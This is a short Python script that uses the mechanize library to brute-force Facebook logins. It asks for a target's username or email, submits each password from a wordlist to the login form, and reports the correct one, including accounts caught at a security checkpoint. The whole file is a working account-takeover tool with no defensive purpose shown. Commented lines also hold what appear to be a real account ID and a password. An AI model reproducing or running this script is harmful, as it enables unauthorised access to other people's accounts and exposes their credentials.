import mechanize
import random
br = mechanize.Browser()
br.set_handle_robots(False)
#useragents = [('User-agent',
#               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
#br.addheaders = [('User-agent', random.choice(useragents))]
#br.addheaders = [('User-agent', 'Google Chrome')]
#br.open('https://www.facebook.com/')
#br.select_form(nr= 0)
#br.form['email'] = '100029455552295'
#br.form['pass'] = 'x'
passwords = open("wordlist.txt", "r")
email = input("Username/Email: ")
for x in passwords:
    br.addheaders = [('User-agent', 'Google Chrome')]
    br.open('https://www.facebook.com/')
    br.select_form(nr= 0)
    br.form['email'] = email
    br.form['pass'] = x
    sub = br.submit()
    if sub.geturl() == "https://www.facebook.com/login/":
        print("Incorect Password " + x)
    elif sub.geturl() == "https://www.facebook.com/checkpoint/?next":
        print("correct password is " + x)
        print("\n")
        print("account is in checkpoint")

    else:
        print("Corect password is " + x)
        break
#br.select_form(nr=0)
#br.form['email'] = '100029455552295'
#br.form['pass'] = '01813102490'
#sub = br.submit()
#print (sub.geturl())
